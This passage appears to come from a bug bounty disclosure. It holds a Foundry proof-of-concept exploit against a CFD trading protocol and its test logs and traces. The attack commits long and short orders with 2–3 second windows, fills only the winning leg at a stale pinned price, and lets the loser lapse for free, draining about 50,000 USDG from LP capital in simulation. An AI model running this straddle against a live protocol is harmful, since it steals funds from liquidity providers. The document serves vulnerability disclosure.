        _advance(1 hours); // one release per round, as in the confirmed sibling PoCs
        _live(PX);
        if (mode == Mode.Baseline) return (0, 0);
        uint256 p1 = down ? PX - (PX * moveBp) / 10_000 : PX + (PX * moveBp) / 10_000;
        uint256 w0 = _accountBalances();

        // Both legs at the largest size the lens allows, committed in the same block. Order alternates per round.
        uint256 sizeL = _maxSize(acctL, CfdTypes.Side.LONG);
        uint256 sizeS = _maxSize(acctS, CfdTypes.Side.SHORT);
        notional = (sizeL * PX) / 1e20;
        bool longFirst = k % 2 == 1;
        uint32 wa = mode == Mode.Honest ? 60 : W1;
        uint32 wb = mode == Mode.Honest ? 60 : W2;
        Leg[2] memory legs;
        legs[0] = longFirst ? Leg(acctL, CfdTypes.Side.LONG, 0, wa) : Leg(acctS, CfdTypes.Side.SHORT, 0, wa);
        legs[1] = longFirst ? Leg(acctS, CfdTypes.Side.SHORT, 0, wb) : Leg(acctL, CfdTypes.Side.LONG, 0, wb);
        legs[0].id = _commit(legs[0].acct, legs[0].side, legs[0].side == CfdTypes.Side.LONG ? sizeL : sizeS, MARGIN, false, legs[0].window);
        legs[1].id = _commit(legs[1].acct, legs[1].side, legs[1].side == CfdTypes.Side.LONG ? sizeL : sizeS, MARGIN, false, legs[1].window);
        uint256 c = _now();
        assertEq(_deadline(legs[0].id), c + legs[0].window, "deadline = commit + window (leg 1)");
        assertEq(_deadline(legs[1].id), c + legs[1].window, "deadline = commit + window (leg 2)");

        // commit + 1: the pinned update prints at PX. The move lands after it and is readable by commit + 2.
        _advance(1);

        if (mode == Mode.Attack) {
            // Each leg, at its own deadline second, is executed by its owner only if the move favours its side.
            for (uint256 i; i < 2; ++i) {
                _warpTo(c + legs[i].window);
                bool favourable = (legs[i].side == CfdTypes.Side.LONG) == down;
                if (favourable) {
                    require(_executed(_ownerExec(legs[i].acct, legs[i].id, PX)), "favourable leg fills at the stale pin");
                }
            }
        }

        // The real executor reaches every still-pending order at its measured latency for this round.
        _warpTo(c + latency);
        for (uint256 i; i < 2; ++i) {
            if (_isPending(legs[i].id)) _keeperExec(legs[i].id, PX);
        }
        for (uint256 i; i < 2; ++i) {
            OrderV3Types.TerminalReason r = _reason(legs[i].id);
            if (mode == Mode.Attack) {
                bool favourable = (legs[i].side == CfdTypes.Side.LONG) == down;
                if (favourable) {
                    assertEq(uint256(r), uint256(OrderV3Types.TerminalReason.Executed), "winner filled at the stale pin");
                } else {
                    assertEq(uint256(r), uint256(OrderV3Types.TerminalReason.Expired), "loser lapsed: Expired, never filled");
                    assertEq(_sizeOf(address(legs[i].acct)), 0, "loser holds no position");
                }
            } else {
                assertEq(uint256(r), uint256(OrderV3Types.TerminalReason.Executed), "honest: executor fills at the pin");
            }
        }

        // Close every filled leg at the moved price: a fresh update prints at p1, close pinned at its commit + 1,
        // executed by the real executor at this round's latency.
        _advance(30);
        _live(p1);
        uint64[2] memory closes;
        for (uint256 i; i < 2; ++i) {
            uint256 sz = _sizeOf(address(legs[i].acct));
            if (sz != 0) closes[i] = _commit(legs[i].acct, legs[i].side, sz, 0, true, 60);
        }
        _advance(latency);
        for (uint256 i; i < 2; ++i) {
            if (closes[i] != 0) require(_executed(_keeperExec(closes[i], p1)), "close fills at the moved price");
        }
        assertEq(_sizeOf(address(acctL)) + _sizeOf(address(acctS)), 0, "flat after the round");
        pnl = int256(_accountBalances()) - int256(w0);
    }

    // ---- one world

    function _run(Mode mode, uint256 rounds, uint256 moveBp, bool nfp) internal returns (Outcome memory o) {
        for (uint256 k; k < rounds; ++k) {
            bool down = nfp ? true : (k == 1 || k == 3 || k == 4); // up, down, up, down, down, up
            uint256 latency = nfp ? 6 : _keeperLatency(k);
            (o.roundPnl[k], o.notional[k]) = _round(k, mode, down, moveBp, latency);
            if (mode == Mode.Attack) {
                ++o.fills;
                ++o.lapses;
            }
        }
        vm.startPrank(ATTACKER);
        acctL.withdrawAll();
        acctS.withdrawAll();
        vm.stopPrank();
        // end state, read from the deployed contracts (visible as call returns in the -vvvv trace)
        o.attackerWallet = settlementToken.balanceOf(ATTACKER);
        o.victimValue = juniorVault.convertToAssets(juniorVault.balanceOf(LP_J));
        o.poolAssets = pool.totalAssets();
    }

    function _report(string memory title, Outcome memory a, Outcome memory h, Outcome memory b, uint256 rounds) internal pure {
        int256 attackerNet = int256(a.attackerWallet) - int256(2 * FUND);
        int256 honestNet = int256(h.attackerWallet) - int256(2 * FUND);
        console2.log(title);
        console2.log(string.concat("  ATTACKER wallet  start ", _usd(2 * FUND), "  end ", _usd(a.attackerWallet), "  delta ", _usdSigned(attackerNet)));
        console2.log(string.concat("  VICTIM LP_J Junior  baseline ", _usd(b.victimValue), "  attack ", _usd(a.victimValue), "  delta ", _usdSigned(int256(a.victimValue) - int256(b.victimValue))));
        console2.log(string.concat("  HousePool.totalAssets  baseline ", _usd(b.poolAssets), "  attack ", _usd(a.poolAssets), "  delta ", _usdSigned(int256(a.poolAssets) - int256(b.poolAssets))));
        console2.log(string.concat("  same orders without the option (honest, executor fills both legs): attacker ", _usdSigned(honestNet), ", LP_J vs honest ", _usdSigned(int256(a.victimValue) - int256(h.victimValue))));
        for (uint256 k; k < rounds; ++k) {
            console2.log(string.concat("  round ", vm.toString(k + 1), ": leg notional ", _usd(a.notional[k]), " USDG, attack P&L ", _usdSigned(a.roundPnl[k]), ", honest P&L ", _usdSigned(h.roundPnl[k])));
        }
    }

    // =================================================================== tests

    function _committed(address a) internal view returns (uint256) {
        return clearinghouse.getLockedMarginBuckets(a).committedOrderMarginAssets;
    }

    function _free(address a) internal view returns (uint256) {
        return clearinghouse.getPnlIsolationBuckets(a).freeSettlementAssets;
    }

    /// @notice ROOT: a 2 s / 3 s window is a legal request, the stored deadline is exactly commit + W, and a lapsed order
    ///         is cancelled for free: the whole committed margin and the open bounty return to the owner.
    function test_root_shortWindowIsAcceptedAndLapsesToFreeCancel() public {
        _setup();
        _advance(30);
        _live(PX);
        uint256 size = _maxSize(acctL, CfdTypes.Side.LONG);
        uint256 totalBefore = clearinghouse.balanceAssets(address(acctL));
        uint256 freeBefore = _free(address(acctL));
        assertEq(_committed(address(acctL)), 0, "no committed-order margin before the open");

        uint64 t1 = _commit(acctL, CfdTypes.Side.LONG, size, MARGIN, false, W2);
        uint256 openBounty = _pending(t1).executionBountyAssets;
        assertEq(_deadline(t1), _commitTime(t1) + W2, "deadline = commitTimestamp + executionWindowSeconds");
        assertEq(_committed(address(acctL)), MARGIN, "committed-order margin bucket holds the margin");
        assertEq(_free(address(acctL)), freeBefore - MARGIN - openBounty, "free settlement dropped by margin + bounty");

        _advance(uint256(W2) + 1); // past the deadline
        vm.prank(ATTACKER);
        acctL.expire(t1);
        assertEq(uint256(_reason(t1)), uint256(OrderV3Types.TerminalReason.Expired), "t1 lapsed as Expired");
        assertEq(_committed(address(acctL)), 0, "committed margin fully released on lapse");
        assertEq(_free(address(acctL)), freeBefore, "free settlement fully restored");
        assertEq(clearinghouse.balanceAssets(address(acctL)), totalBefore, "total balance unchanged (cost 0)");
        assertEq(_sizeOf(address(acctL)), 0, "no position");
        console2.log(string.concat("root: ", _usd((size * PX) / 1e20), " USDG LONG, window ", vm.toString(uint256(W2)), " s, margin ", _usd(MARGIN), ", bounty ", _usd(openBounty), "; lapse cost to owner 0"));
    }

    /// @notice PATH: the lapse is terminal Expired (2) / Failed (3) with no liquidation, no settleLpEpoch and no pool-depth
    ///         change. Owner-expiry costs 0; a third-party cleaner costs the owner only the open bounty (<= 0.20 USDG).
    function test_path_expiryIsTerminalExpired_costAtMostBounty() public {
        _setup();
        _advance(30);
        _live(PX);
        uint256 size = _maxSize(acctL, CfdTypes.Side.LONG);
        uint256 balA0 = clearinghouse.balanceAssets(address(acctL));
        uint64 t1 = _commit(acctL, CfdTypes.Side.LONG, size, MARGIN, false, W2);
        _advance(uint256(W2) + 1);
        uint256 depthBefore = pool.totalAssets();
        vm.prank(ATTACKER);
        acctL.expire(t1);
        OrderV3Types.TerminalOutcome memory oc = router.lifecycleBook().terminalOutcome(t1);
        assertEq(uint256(oc.status), uint256(OrderV3Types.LifecycleStatus.Failed), "t1 failed");
        assertEq(uint256(oc.reason), uint256(OrderV3Types.TerminalReason.Expired), "t1 lapsed as Expired");
        assertEq(pool.totalAssets(), depthBefore, "LP depth unchanged by the lapse");
        assertEq(clearinghouse.balanceAssets(address(acctL)), balA0, "owner-expiry: margin and bounty back, cost 0");

        _advance(30);
        _live(PX);
        uint256 balB0 = clearinghouse.balanceAssets(address(acctL));
        uint64 t2 = _commit(acctL, CfdTypes.Side.LONG, size, MARGIN, false, W2);
        _advance(uint256(W2) + 1);
        vm.prank(THIRD);
        router.expireOrder(t2);
        assertEq(uint256(_reason(t2)), uint256(OrderV3Types.TerminalReason.Expired), "t2 lapsed as Expired");
        assertLe(balB0 - clearinghouse.balanceAssets(address(acctL)), 200_000, "third-party cleaner: cost <= 0.20 USDG");
        assertEq(_sizeOf(address(acctL)), 0, "no position");
    }

    /// @notice LATENCY: the real executor's measured latencies against the windows. 2 s order reached at 3 s (the
    ///         fastest 6-Nov latency) and 3 s order reached at 4 s (the fastest of orders 183-188) are Expired; the
    ///         boundary is shown too: a 3 s order reached at 3 s fills at the pin.
    function test_latency_realExecutorCannotFillShortWindow() public {
        _setup();
        uint256[3] memory win = [uint256(W1), uint256(W2), uint256(W2)];
        uint256[3] memory lat = [uint256(3), uint256(4), uint256(3)];
        for (uint256 i; i < 3; ++i) {
            _advance(1 hours);
            _live(PX);
            uint256 size = _maxSize(acctS, CfdTypes.Side.SHORT);
            uint64 id = _commit(acctS, CfdTypes.Side.SHORT, size, MARGIN, false, uint32(win[i]));
            uint256 c = _now();
            _warpTo(c + lat[i]);
            OrderV3Types.ExecutionResult memory r = _keeperExec(id, PX);
            console2.log(string.concat("  window ", vm.toString(win[i]), " s, executor at commit + ", vm.toString(lat[i]), " s: terminal reason ", vm.toString(uint256(r.terminalReason)), " (1 Executed, 2 Expired)"));
            if (lat[i] > win[i]) {
                assertEq(uint256(r.terminalReason), uint256(OrderV3Types.TerminalReason.Expired), "executor too late: Expired");
                assertEq(_sizeOf(address(acctS)), 0, "never filled at the pin");
            } else {
                assertEq(uint256(r.terminalReason), uint256(OrderV3Types.TerminalReason.Executed), "boundary: fills");
                _advance(1);
                _live(PX);
                uint64 cl = _commit(acctS, CfdTypes.Side.SHORT, _sizeOf(address(acctS)), 0, true, 60);
                _advance(1);
                require(_executed(_keeperExec(cl, PX)), "close");
            }
        }
    }

    /// @notice IMPACT (release moves): six rounds of 30 bps, the path and size of the confirmed #97858 PoC. Every round
    ///         the attacker commits a LONG and a SHORT at the lens maximum; the winner fills at the stale pin, the loser
    ///         lapses. Three worlds from one snapshot; every figure read from system state.
    function test_impact_maxStraddle_releaseMoves() public {
        _setup();
        uint256 snap = vm.snapshotState();
        Outcome memory a = _run(Mode.Attack, ROUNDS, MOVE_BP, false);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        Outcome memory h = _run(Mode.Honest, ROUNDS, MOVE_BP, false);
        vm.revertToState(snap);
        Outcome memory b = _run(Mode.Baseline, ROUNDS, MOVE_BP, false);

        console2.log("IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)");
        _report("=== six 30 bp release rounds, executor at its real latencies (4,6,7,4,5,6 s)", a, h, b, ROUNDS);

        assertEq(a.fills, ROUNDS, "every round: the winner fills at the stale pin");
        assertEq(a.lapses, ROUNDS, "every round: the loser lapses Expired");
        assertApproxEqAbs(b.attackerWallet, 2 * FUND, 10, "baseline: capital unchanged");
        assertGt(a.attackerWallet, 2 * FUND, "ATTACK: attacker wallet ends above its capital");
        assertLt(h.attackerWallet, 2 * FUND, "HONEST: the same binding orders lose");
        assertLt(a.victimValue, b.victimValue, "victim LP_J below the no-attacker baseline");
        for (uint256 k; k < ROUNDS; ++k) assertGt(a.roundPnl[k], 0, "every round profitable, either direction");
    }

    /// @notice IMPACT (real 6-Nov NFP magnitude): one round with the deployment's own NFP move (pinned 13:30:00 mark to
    ///         the next real mark, -13.04 bp) and the executor's 6-Nov median latency (6 s).
    function test_impact_maxStraddle_realNfpMove() public {
        _setup();
        uint256 p1 = (PX * NFP_NEXT_MARK) / NFP_PIN_MARK; // the real ratio applied to the 1.00 fixture basket
        uint256 snap = vm.snapshotState();
        Outcome memory a = _runNfp(Mode.Attack, p1);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        Outcome memory h = _runNfp(Mode.Honest, p1);
        vm.revertToState(snap);
        Outcome memory b = _runNfp(Mode.Baseline, p1);

        console2.log("IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)");
        _report("=== one round at the real 6-Nov NFP move (-13.04 bp), executor at its 6-Nov median (6 s)", a, h, b, 1);
        assertGt(a.attackerWallet, 2 * FUND, "ATTACK: attacker wallet ends above its capital");
        assertLt(h.attackerWallet, 2 * FUND, "HONEST: the same binding orders lose");
        assertLt(a.victimValue, b.victimValue, "victim LP_J below the no-attacker baseline");
    }

    // The NFP round uses the exact real ratio instead of a whole-bp move.
    function _runNfp(Mode mode, uint256 p1) internal returns (Outcome memory o) {
        (o.roundPnl[0], o.notional[0]) = _roundWithPrice(mode, p1, 6);
        vm.startPrank(ATTACKER);
        acctL.withdrawAll();
        acctS.withdrawAll();
        vm.stopPrank();
        o.attackerWallet = settlementToken.balanceOf(ATTACKER);
        o.victimValue = juniorVault.convertToAssets(juniorVault.balanceOf(LP_J));
        o.poolAssets = pool.totalAssets();
    }

    function _roundWithPrice(Mode mode, uint256 p1, uint256 latency) internal returns (int256 pnl, uint256 notional) {
        // identical to _round with down = true, an exact close price, SHORT leg first
        _advance(1 hours);
        _live(PX);
        if (mode == Mode.Baseline) return (0, 0);
        uint256 w0 = _accountBalances();
        uint256 sizeL = _maxSize(acctL, CfdTypes.Side.LONG);
        uint256 sizeS = _maxSize(acctS, CfdTypes.Side.SHORT);
        notional = (sizeL * PX) / 1e20;
        uint32 wa = mode == Mode.Honest ? 60 : W1;
        uint32 wb = mode == Mode.Honest ? 60 : W2;
        uint64 idS = _commit(acctS, CfdTypes.Side.SHORT, sizeS, MARGIN, false, wa);
        uint64 idL = _commit(acctL, CfdTypes.Side.LONG, sizeL, MARGIN, false, wb);
        uint256 c = _now();
        _advance(1); // commit + 1: pinned update at PX
        if (mode == Mode.Attack) {
            _warpTo(c + W1); // SHORT leg's deadline: the release is down, SHORT declined
            _warpTo(c + W2); // LONG leg's deadline: executed at the stale pin (prunes the lapsed SHORT)
            require(_executed(_ownerExec(acctL, idL, PX)), "LONG fills at the stale pin");
        }
        _warpTo(c + latency);
        if (_isPending(idS)) _keeperExec(idS, PX);
        if (_isPending(idL)) _keeperExec(idL, PX);
        if (mode == Mode.Attack) {
            assertEq(uint256(_reason(idS)), uint256(OrderV3Types.TerminalReason.Expired), "SHORT lapsed");
            assertEq(uint256(_reason(idL)), uint256(OrderV3Types.TerminalReason.Executed), "LONG filled");
        } else {
            assertEq(uint256(_reason(idS)), uint256(OrderV3Types.TerminalReason.Executed), "honest SHORT filled");
            assertEq(uint256(_reason(idL)), uint256(OrderV3Types.TerminalReason.Executed), "honest LONG filled");
        }
        _advance(30);
        _live(p1);
        uint64 cS;
        uint64 cL;
        if (_sizeOf(address(acctS)) != 0) cS = _commit(acctS, CfdTypes.Side.SHORT, _sizeOf(address(acctS)), 0, true, 60);
        if (_sizeOf(address(acctL)) != 0) cL = _commit(acctL, CfdTypes.Side.LONG, _sizeOf(address(acctL)), 0, true, 60);
        _advance(latency);
        if (cS != 0) require(_executed(_keeperExec(cS, p1)), "close S");
        if (cL != 0) require(_executed(_keeperExec(cL, p1)), "close L");
        pnl = int256(_accountBalances()) - int256(w0);
    }
}
```

### Output

`forge test --match-path test/poc_shortwindow/ShortWindowStraddlePoC.t.sol -vv` (gist `forge-test-vv.log`)
```
No files changed, compilation skipped

Ran 5 tests for test/poc_shortwindow/ShortWindowStraddlePoC.t.sol:ShortWindowStraddlePoC
[PASS] test_impact_maxStraddle_realNfpMove() (gas: 27556916)
Logs:
  IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)
  === one round at the real 6-Nov NFP move (-13.04 bp), executor at its 6-Nov median (6 s)
    ATTACKER wallet  start 800000.000000  end 801592.724089  delta +1592.724089
    VICTIM LP_J Junior  baseline 9999999.999991  attack 9996808.956125  delta -3191.043866
    HousePool.totalAssets  baseline 10000002.000000  attack 9996810.955831  delta -3191.044169
    same orders without the option (honest, executor fills both legs): attacker -23136.386106, LP_J vs honest -19937.598541
    round 1: leg notional 3996000.000000 USDG, attack P&L +1592.724089, honest P&L -23136.386106

[PASS] test_impact_maxStraddle_releaseMoves() (gas: 141709125)
Logs:
  IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)
  === six 30 bp release rounds, executor at its real latencies (4,6,7,4,5,6 s)
    ATTACKER wallet  start 800000.000000  end 850065.401618  delta +50065.401618
    VICTIM LP_J Junior  baseline 9999999.999943  attack 9940367.323914  delta -59632.676029
    HousePool.totalAssets  baseline 10000002.000000  attack 9940369.318302  delta -59632.681698
    same orders without the option (honest, executor fills both legs): attacker -139550.065802, LP_J vs honest -160657.948303
    round 1: leg notional 3996000.000000 USDG, attack P&L +8386.522047, honest P&L -23218.926262
    round 2: leg notional 3992000.000000 USDG, attack P&L +8335.182291, honest P&L -23142.609072
    round 3: leg notional 3988000.000000 USDG, attack P&L +8369.718084, honest P&L -23296.753154
    round 4: leg notional 3984000.000000 USDG, attack P&L +8318.488122, honest P&L -23219.937915
    round 5: leg notional 3980100.000000 USDG, attack P&L +8310.541550, honest P&L -23258.623669
    round 6: leg notional 3976100.000000 USDG, attack P&L +8344.949524, honest P&L -23413.215730

[PASS] test_latency_realExecutorCannotFillShortWindow() (gas: 15694688)
Logs:
    window 2 s, executor at commit + 3 s: terminal reason 2 (1 Executed, 2 Expired)
    window 3 s, executor at commit + 4 s: terminal reason 2 (1 Executed, 2 Expired)
    window 3 s, executor at commit + 3 s: terminal reason 1 (1 Executed, 2 Expired)

[PASS] test_path_expiryIsTerminalExpired_costAtMostBounty() (gas: 8460086)
[PASS] test_root_shortWindowIsAcceptedAndLapsesToFreeCancel() (gas: 6518640)
Logs:
  root: 3996000.000000 USDG LONG, window 3 s, margin 200000.000000, bounty 0.200000; lapse cost to owner 0

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 174.29ms (229.29ms CPU time)

Ran 1 test suite in 177.17ms (174.29ms CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)
```

Raw `-vvvv` trace, attack world, from gist `forge-test-vvvv-test_impact_maxStraddle_releaseMoves.log`. Round 1: the SHORT leg fills at the stale pin (line 1876) and returns Executed (line 1918). The LONG leg, reached by the executor at commit + 4, returns `status: 3, terminalReason: 2`, Expired (line 2083).
```
    │   │   │   │   │   │   ├─ emit PositionOpened(account: OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8], side: 1, sizeDelta: 3996000000000000000000000 [3.996e24], price: 100005000 [1e8], marginDelta: 200000000000 [2e11])
    │   └─ ← [Return] ExecutionResult({ orderId: 1, status: 2, terminalReason: 1, pendingReason: 0, receiptHash: 0x137ddbb52e25f80006d3a2d2a4d096c8759c47d870bde0ccc8ffbccc0fa69e37 })
    │   └─ ← [Return] ExecutionResult({ orderId: 2, status: 3, terminalReason: 2, pendingReason: 0, receiptHash: 0x279807546555779d56f594de1d84ec8b4b53695a6dd9cda12680d20d1e2e422b })
```

Round 1 close: the pool pays the winner's PnL out of LP capital (lines 2877-2881 and 2905-2910).
```
    │   │   │   │   │   │   │   ├─ [3777] HousePool::payOut(MarginClearinghouse: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 11588400000 [1.158e10])
    │   │   │   │   │   │   │   │   ├─ [2952] MockSettlementToken::transfer(MarginClearinghouse: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 11588400000 [1.158e10])
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: HousePool: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], to: MarginClearinghouse: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amount: 11588400000 [1.158e10])
    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   ├─ emit PositionClosed(account: OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8], side: 1, sizeDelta: 3996000000000000000000000 [3.996e24], price: 100295000 [1.002e8], pnl: 11588400000 [1.158e10])
    │   │   │   │   │   ├─ [1251] HousePool::totalAssets() [staticcall]
    │   │   │   │   │   │   ├─ [537] MockSettlementToken::balanceOf(HousePool: [0xD16d567549A2a2a2005aEACf7fB193851603dd70]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 9990016798033 [9.99e12]
    │   │   │   │   │   │   └─ ← [Return] 9990016798033 [9.99e12]
```

End of the attack world: both accounts withdraw to the attacker, whose wallet reads 850065401618 (lines 15576-15621). Then LP_J's Junior value and the pool (lines 15624, 15669-15673).
```
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   ├─ [29652] MockSettlementToken::transfer(OptionAccount: [0x6b182f1488E8EfEb2Eb298155ed5Bd7FF8A14042], 424964211963 [4.249e11])
    │   │   │   ├─ emit Transfer(from: MarginClearinghouse: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: OptionAccount: [0x6b182f1488E8EfEb2Eb298155ed5Bd7FF8A14042], amount: 424964211963 [4.249e11])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit Withdraw(account: OptionAccount: [0x6b182f1488E8EfEb2Eb298155ed5Bd7FF8A14042], asset: MockSettlementToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 424964211963 [4.249e11])
    │   │   └─ ← [Stop]
    │   ├─ [537] MockSettlementToken::balanceOf(OptionAccount: [0x6b182f1488E8EfEb2Eb298155ed5Bd7FF8A14042]) [staticcall]
    │   │   └─ ← [Return] 424964211963 [4.249e11]
    │   ├─ [24852] MockSettlementToken::transfer(0x00000000000000000000000000000000000A11cE, 424964211963 [4.249e11])
    │   │   ├─ emit Transfer(from: OptionAccount: [0x6b182f1488E8EfEb2Eb298155ed5Bd7FF8A14042], to: 0x00000000000000000000000000000000000A11cE, amount: 424964211963 [4.249e11])
    │   │   └─ ← [Return] true
    │   └─ ← [Return]
    ├─ [123832] OptionAccount::withdrawAll()
    │   ├─ [3224] MarginClearinghouse::balanceAssets(OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8]) [staticcall]
    │   │   └─ ← [Return] 425101189655 [4.251e11]
    │   ├─ [86719] MarginClearinghouse::withdrawMargin(425101189655 [4.251e11])
    │   │   ├─ [3903] CfdEngine::realizeCarryBeforeMarginChange(OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8])
    │   │   │   └─ ← [Return]
    │   │   ├─ [31235] CfdEngine::checkWithdraw(OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8])
    │   │   │   ├─ [21895] CfdEngineSettlementSidecar::validateWithdraw(OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8])
    │   │   │   │   ├─ [12165] CfdEngine::positions(OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8]) [staticcall]
    │   │   │   │   │   ├─ [3476] MarginClearinghouse::pnlPledgeAssets(OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0, 0, 0, 0
    │   │   │   │   ├─ [1597] CfdEngine::orderRouter() [staticcall]
    │   │   │   │   │   └─ ← [Return] LegacyOrderRouterHarness: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF]
    │   │   │   │   ├─ [3000] LegacyOrderRouterHarness::accountHeadOrderId(OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   ├─ [29652] MockSettlementToken::transfer(OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8], 425101189655 [4.251e11])
    │   │   │   ├─ emit Transfer(from: MarginClearinghouse: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8], amount: 425101189655 [4.251e11])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit Withdraw(account: OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8], asset: MockSettlementToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 425101189655 [4.251e11])
    │   │   └─ ← [Stop]
    │   ├─ [537] MockSettlementToken::balanceOf(OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8]) [staticcall]
    │   │   └─ ← [Return] 425101189655 [4.251e11]
    │   ├─ [7752] MockSettlementToken::transfer(0x00000000000000000000000000000000000A11cE, 425101189655 [4.251e11])
    │   │   ├─ emit Transfer(from: OptionAccount: [0xfc14A3000713f07C3B16b1e22125a67949d67bd8], to: 0x00000000000000000000000000000000000A11cE, amount: 425101189655 [4.251e11])
    │   │   └─ ← [Return] true
    │   └─ ← [Return]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [2537] MockSettlementToken::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
    │   └─ ← [Return] 850065401618 [8.5e11]
    ├─ [153843] TrancheVault::convertToAssets(10516805838924762 [1.051e16]) [staticcall]
    │   └─ ← [Return] 9940367323914 [9.94e12]
    ├─ [7751] HousePool::totalAssets() [staticcall]
    │   ├─ [2537] MockSettlementToken::balanceOf(HousePool: [0xD16d567549A2a2a2005aEACf7fB193851603dd70]) [staticcall]
    │   │   └─ ← [Return] 9940369318302 [9.94e12]
    │   └─ ← [Return] 9940369318302 [9.94e12]
```

The same reads at the end of the no-attacker world (lines 38678-38679, 38682, 38727-38731).
```
    ├─ [2537] MockSettlementToken::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
    │   └─ ← [Return] 800000000000 [8e11]
    ├─ [153400] TrancheVault::convertToAssets(10516805838924762 [1.051e16]) [staticcall]
    │   └─ ← [Return] 9999999999943 [9.999e12]
    ├─ [7751] HousePool::totalAssets() [staticcall]
    │   ├─ [2537] MockSettlementToken::balanceOf(HousePool: [0xD16d567549A2a2a2005aEACf7fB193851603dd70]) [staticcall]
    │   │   └─ ← [Return] 10000002000000 [1e13]
    │   └─ ← [Return] 10000002000000 [1e13]
```

The attacker's wallet goes from 800,000.00 to 850,065.40 USDG, +50,065.40, and the victim LP's Junior ends 59,632.68 USDG below the same hours with no attacker.

